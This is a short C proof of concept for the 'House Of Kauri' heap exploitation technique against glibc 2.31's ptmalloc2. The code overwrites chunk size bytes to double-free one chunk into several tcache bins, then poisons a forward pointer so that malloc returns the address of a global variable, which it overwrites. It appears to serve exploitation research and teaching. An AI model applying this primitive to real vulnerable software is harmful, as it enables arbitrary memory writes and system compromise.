/* House Of Kauri
https://awaraucom.wordpress.com/2020/06/20/house-of-kauri/
This is a demonstration of a novel method for tampering with heap meta-data in ptmalloc2.
It has been tested on GLibc 2.31, Ubuntu 20.04. In terms of exploitation the requirements are as follows:
- Attacker can allocate chunks of variable sizes.
- Attacker can free chunks.
- Attacker can overflow chunks multiple times.
This is purely double free and overflow. There is no use-after-free necessary.
Note that it may in some cases also be possible to overflow the forward pointer of the next chunk, leading to an effect like a use-after-free.
*/
#include <stdlib.h>
#include <assert.h>
unsigned long victim = 1;
int main()
{
    int *a, *b, *c, *d, *e;
    a = malloc(20);
    b = malloc(20);
    free(b);
    *((char *)a + 24) = 0x71;
    free(b);
    *((char *)a + 24) = 0x41;
    free(b);
    *((char *)a + 24) = 0x61;
    free(b);
    e = malloc(0x60);
    free(e);
    //we can get the chunk from another list 
    //so as to not decrement the t-cache count
    int *f = malloc(0x10);
    *f = &victim;
    c = malloc(0x55);
    d = malloc(0x55);
    *d = 2;
    assert(victim == 2);
    return 0;
}